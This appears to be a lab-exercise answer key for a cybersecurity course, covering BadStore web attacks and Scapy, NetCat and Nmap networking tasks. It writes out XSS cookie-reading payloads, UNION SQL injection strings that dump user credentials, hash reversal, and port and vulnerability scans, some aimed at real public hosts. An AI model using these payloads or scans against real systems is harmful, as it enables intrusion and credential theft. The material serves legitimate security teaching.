## Q1 A. BadStore's cart cookie – which field gives a discount?

**Answer: Field 3 (the price field)**

**Steps:**
1. Open BadStore, log in, add an item to the cart.
2. Use XSS in the search box to view cookies:
   ```
   <script>alert(document.cookie)</script>
   ```
3. Copy the `CartID` cookie value, e.g.:
   ```
   CartID=1527258326%3A1%3A11.5%3A1000
   ```
4. URL-decode it at https://www.urldecoder.org → Result:
   ```
   1527258326:1:11.5:1000
   ```
   - Field 1: Unix timestamp
   - Field 2: Quantity
   - **Field 3: Price (11.5) ← Change this for a discount**
   - Field 4: Item ID (1000)

**Answer:** An attacker can change **Field 3 (price)** to get a discount.

---

## Q1 B. Scapy – Create Ethernet + IP + TCP frame and show all fields

**Code:**
```python
from scapy.all import *

# Create IP/TCP packet
packet = IP() / TCP()

# Wrap in Ethernet frame
frame = Ether() / packet

# Show all fields
frame.show()
```

**Run with:**
```bash
sudo python3 script.py
```

**Output will display all layers:** Ethernet (dst, src, type), IP (version, ihl, ttl, src, dst), TCP (sport, dport, flags, seq, ack, etc.)

---

## Q1 C. Shell Script for Port Scan using NetCat

```bash
#!/bin/bash
host="www.example.com"
read -p "Enter starting port: " start_port
read -p "Enter ending port: " end_port

for (( port=start_port; port<=end_port; port++ ))
do
    echo "Scanning port $port..."
    nc -zv -w1 "$host" "$port" 2>&1
done
```

**Save and run:**
```bash
chmod +x port_scan.sh
./port_scan.sh
```

**Flags used:**
- `-z` : Zero I/O mode (scanning only)
- `-v` : Verbose output
- `-w1` : 1-second timeout per port

---

## Q2 A. BadStore – Login as joe@supplier.com and find credit card number for $46.95

**Steps:**
1. From the admin panel (after SQL injection to get admin credentials `admin:secret`), navigate to:
   ```
   http://192.168.x.x/cgi-bin/badstore.cgi?action=adminportal
   ```
2. Find joe@supplier.com's MD5 hash: `62072d95acb588c7ee9d6fa0c6c85155`
3. Reverse MD5 at https://md5.gromweb.com → Password: **`secret`**
4. Log in as `joe@supplier.com` with password `secret` via Login/Register (not Supplier Login).
5. Click **View Previous Orders**.
6. Use Ctrl+F to find `$46.95`.

**Answer:**
- `4111 1111 1111 1111`
- `5500 0000 0000 0004`

---

## Q2 B. Scapy – Sniff 10 packets and show details of all packets

**Code:**
```python
from scapy.all import *

# Sniff 10 packets
packets = sniff(count=10)

# Show summary of all
packets.summary()

# Show full details of each packet
for i in range(len(packets)):
    print(f"\n--- Packet {i} ---")
    print(packets[i].show())
```

**Run with:**
```bash
sudo python3 sniff.py
```

---

## Q2 C. NetCat – Communicate using 2 terminals (same machine and across systems)

**Same Machine:**

Terminal 1 (Server/Listener):
```bash
nc -vlp 1234
```

Terminal 2 (Client):
```bash
nc localhost 1234
```

Type messages in either terminal – they appear in the other.

**Across Two Systems:**

Machine A (Server):
```bash
nc -vlp 1234
```

Machine B (Client):
```bash
nc <IP_of_Machine_A> 1234
```

Type messages from either side to communicate.

---

## Q3 A. Scapy – Perform Traceroute

**Code:**
```python
from scapy.all import *

# Perform traceroute to two destinations
result, _ = traceroute(["www.example.com", "www.google.com"], maxttl=20)

# Display the result
result.show()
```

**Run with:**
```bash
sudo python3 traceroute.py
```

The output shows each hop from your machine to the destination, with TTL and response times.

---

## Q3 B. NetCat – HTTP GET and HEAD Requests

**Connect to server:**
```bash
nc example.com 80
```

**Then type (GET Request):**
```
GET / HTTP/1.1
Host: example.com

```
*(Press Enter twice after Host)*

→ Server returns full HTML response.

**HEAD Request:**
```bash
nc example.com 80
```
Then type:
```
HEAD / HTTP/1.1
Host: example.com

```
→ Server returns only HTTP headers (no body).

---

## Q3 C. Nmap – Ping Scan and Scan a Single IP

**Ping Scan (host discovery only):**
```bash
nmap -sn www.google.com
nmap -sn 192.168.1.0/24
```
- Checks if hosts are alive (no port scan performed)
- `-sn` = Ping Scan (no port scan)

**Scan a Single IP:**
```bash
nmap 192.168.56.1
```
- Performs a basic port scan on the target IP
- Shows open ports and their services

---

## Q4 A. Scapy – Network Scanner using ARP

**Code:**
```python
import scapy.all as scapy

# Create ARP packet
request = scapy.ARP()

# Set destination to network range (use ifconfig to find your subnet)
request.pdst = '192.168.1.0/24'   # Replace with your network

# Create Ethernet broadcast frame
broadcast = scapy.Ether()
broadcast.dst = 'ff:ff:ff:ff:ff:ff'

# Combine ARP + Ethernet
request_broadcast = broadcast / request

# Send and capture responses
clients = scapy.srp(request_broadcast, timeout=1)[0]

# Print IP and MAC of discovered hosts
for element in clients:
    print(element[1].psrc + "    " + element[1].hwsrc)
```

**Run with:**
```bash
sudo python3 network_scanner.py
```

---

## Q4 B. NetCat – Browser-to-Server Communication (Plain Text)

**Step 1:** Start NetCat listener on port 5000:
```bash
nc -l -p 5000
```

**Step 2:** Open browser and go to:
```
http://localhost:5000/
```

**Step 3:** The browser's HTTP request appears in the NetCat terminal. Now type a valid HTTP response:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<html><body><h1>Hello from Netcat!</h1></body></html>
```
Press **Enter twice** after headers.

The browser displays the HTML page.

---

## Q4 C. Nmap – Scan a Range of IPs and an Entire Subnet

**Scan a Range:**
```bash
nmap 192.168.1.100-120
```
Or with specific IPs:
```bash
nmap 192.168.1.5 192.168.1.10 192.168.1.15
```

**Scan Entire Subnet:**
```bash
nmap 192.168.1.0/24
```
- Scans all 256 IPs from 192.168.1.0 to 192.168.1.255

---

## Q5 A. BadStore – Key of the Cart Cookie

**Steps:**
1. Add an item to the cart in BadStore.
2. Use XSS attack in the search box:
   ```
   <script>alert(document.cookie)</script>
   ```
3. Two cookies appear in the alert: `SSOid` and `CartID`.

**Answer: `CartID`**

---

## Q5 B. Nmap – Scan Top 1000 Ports and Detect Service Version

**Top 1000 Ports (default scan):**
```bash
nmap 192.168.56.1
nmap www.google.com
```

**Detect Service Version:**
```bash
nmap -sV 192.168.56.1
nmap -sV www.google.com
```
- Shows port, state, service name, and exact version (e.g., Apache 2.4.51, OpenSSH 8.2)

---

## Q6 C. Nmap – OS Detection and Aggressive Scan

**OS Detection:**
```bash
nmap -O 192.168.56.1
nmap -O bnmit.org
```
- Identifies the operating system running on the target host.

**Aggressive Scan (combines -sV, -O, --script=default, --traceroute):**
```bash
nmap -A 192.168.56.1
nmap -A google.com
```
Output includes: service versions, OS details, script results, and traceroute.

---

## Q7 A. BadStore – Hidden Form Field Name for User Privilege Level

**Steps:**
1. Log in as `admin` with password `secret`.
2. Go to:
   ```
   http://192.168.x.x/cgi-bin/badstore.cgi?action=adminportal
   ```
3. Right-click → View Page Source (Ctrl+U), then Ctrl+F to search for `hidden`.
4. You will find:
   ```html
   <INPUT TYPE="hidden" NAME="password" VALUE="...">
   ```

**Answer: `password`**

---

## Q7 B. Scapy – Send ICMP Packet to 8.8.8.8 and Capture in Wireshark

**Code:**
```python
from scapy.all import *

# Create ICMP packet destined for Google DNS
packet = IP(dst="8.8.8.8") / ICMP()

# Send packet
send(packet)
print("ICMP packet sent to 8.8.8.8")
```

**Run with:**
```bash
sudo python3 icmp_send.py
```

**Wireshark Steps:**
1. Open Wireshark, select your network interface.
2. Set filter: `icmp`
3. Run the script → ICMP Echo Request from your IP to 8.8.8.8 appears.
4. You will also see the Echo Reply from 8.8.8.8.

---

## Q7 C. NetCat – Browser-to-Server Communication (Image)

**Step 1:** Save any image as `image.jpg` in current directory.

**Step 2:** Serve it with proper HTTP headers using a bash script:
```bash
#!/bin/bash
IMGFILE="image.jpg"
IMGSIZE=$(wc -c < "$IMGFILE")

{ 
  printf "HTTP/1.1 200 OK\r\n"
  printf "Content-Type: image/jpeg\r\n"
  printf "Content-Length: $IMGSIZE\r\n"
  printf "\r\n"
  cat "$IMGFILE"
} | nc -l -p 8080
```

**Step 3:** Open browser and go to:
```
http://localhost:8080
```

The image displays in the browser.

---

## Q8 A. BadStore – How many items in the database? (SQL Injection)

**Steps:**
1. In the search box, type `x` → observe the disclosed query:
   ```
   SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE 'x' IN (itemnum,sdesc,ldesc)
   ```
2. Use UNION injection with COUNT():
   ```
   x' union select count(itemnum),count(itemnum),count(itemnum),count(itemnum) from itemdb -- 
   ```
   *(Ensure there is a space after `--`)*

3. Or visit URL:
   ```
   http://192.168.x.x/cgi-bin/badstore.cgi?searchquery=x'+union+select+count(itemnum),count(itemnum),count(itemnum),count(itemnum)+from+itemdb+--+&action=search&x=11&y=9
   ```

**Answer: 16 items**

---

## Q8 B. Scapy – Perform a Port Scan on www.example.com

**Code:**
```python
from scapy.all import *

# Target IP
target_ip = "93.184.215.14"  # IP of www.example.com

# Ports to scan
ports = [22, 80, 443]

# SYN scan on each port
for port in ports:
    packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
    response = sr1(packet, timeout=1, verbose=0)
    
    if response:
        if response[TCP].flags == "SA":
            print(f"Port {port} is OPEN")
        elif response[TCP].flags == "RA":
            print(f"Port {port} is CLOSED")
    else:
        print(f"Port {port} - No response (filtered)")
```

**Run with:**
```bash
sudo python3 port_scan_scapy.py
```

---

## Q8 C. Nmap – Scan for Vulnerabilities and Save Results to File

**Vulnerability Scan:**
```bash
nmap --script vuln google.com
nmap --script vuln 192.168.56.1
```
Checks for known CVEs, SSL issues (Heartbleed, POODLE), misconfigured services, CSRF, etc.

**Save Results to Text File:**
```bash
nmap -oN results.txt 192.168.56.1
nmap --script vuln -oN vuln_results.txt 192.168.56.1
```
- `-oN results.txt` → Normal text output saved to file

---

## Q9 A. BadStore – What can suppliers do in the "Suppliers Only" area?

**Steps:**
1. Use SQL injection on the search box to get credentials:
   ```
   xx' IN (itemnum,sdesc,ldesc) union select email,passwd,123,123 from userdb LIMIT 10 --
   ```
2. Find joe@supplier.com (Role = S), hash: `62072d95acb588c7ee9d6fa0c6c85155`
3. Reverse MD5 → Password: `secret`
4. Log in as `joe@supplier.com` → Redirected to:
   ```
   http://192.168.x.x/cgi-bin/badstore.cgi?action=supplierportal
   ```

**Answer:** Suppliers can **Upload Price Lists**.

---

## Q9 B. Scapy – ICMP Packet Monitor using Callback Function

**Code:**
```python
from scapy.all import *

# Callback function triggered for each captured packet
def packet_callback(packet):
    if packet[IP].proto == 1:  # Protocol 1 = ICMP
        print(f"ICMP packet from {packet[IP].src}")

# Start sniffing – captures only ICMP packets
# store=0 means don't store in memory (saves RAM)
sniff(prn=packet_callback, filter="icmp", store=0)
```

**Run with:**
```bash
sudo python3 icmp_monitor.py
```

Then in another terminal run:
```bash
ping 8.8.8.8
```

You will see ICMP packets printed as they arrive.

---

## Q9 C. Nmap – Scan Top 1000 Ports and Service Version (repeat variation)

**Top 1000 Ports:**
```bash
nmap 192.168.1.1
nmap bnmit.org
```

**Service Version Detection:**
```bash
nmap -sV 192.168.56.1
nmap -sV bnmit.org
```

Example output:
```
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.51
443/tcp open  https   OpenSSL 1.1.1
```

---

## Q10 A. BadStore – Find the two users with @whole.biz emails

**Steps:**
1. Log in as `admin:secret`.
2. Navigate to:
   ```
   http://192.168.x.x/cgi-bin/badstore.cgi?action=adminportal
   ```
3. View all users in the Secret Administration Portal.
4. Use Ctrl+F → search for `whole.biz`.

**Answer:**
- `fred@whole.biz` → **fred**
- `landon@whole.biz` → **landon**

---

## Q10 B. Scapy – Identify Hosts Up in Local Network using ARP

**Code:**
```python
from scapy.all import *

# Define target subnet
target_subnet = "192.168.1.0/24"

# Send ARP requests to all hosts in subnet
answered, unanswered = srp(
    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_subnet),
    timeout=2,
    verbose=False
)

# Print discovered hosts
print("Host Up\t\t\tMAC Address")
print("-" * 40)
for sent, received in answered:
    print(f"Host Up: {received.psrc}  MAC: {received.hwsrc}")
```

**Run with:**
```bash
sudo python3 arp_scan.py
```

---

## Q10 C. BadStore – Key of the Session Cookie

**Steps:**
1. Log in to BadStore with any account.
2. In the search box, paste (use Firefox, not Chrome):
   ```
   <script>alert(document.cookie)</script>
   ```
3. An alert appears showing: `SSOid=<value>; CartID=<value>`

**Answer: `SSOid`**

---

## Q11 A. Scapy – Traceroute on www.example.com and www.google.com

```python
from scapy.all import *

# Traceroute to both destinations
result, _ = traceroute(["www.example.com", "www.google.com"], maxttl=20)

# Display results
result.show()
```

**Run with:**
```bash
sudo python3 traceroute.py
```

Output shows each router hop, IP at each TTL level, and RTT – giving the full path from your machine to the destination.

---

## Q11 B. BadStore – Cart Cookie Key (repeat)

Same as Q13.

**Answer: `CartID`**

---

*End of Lab Programs – CCS 23CSE162*
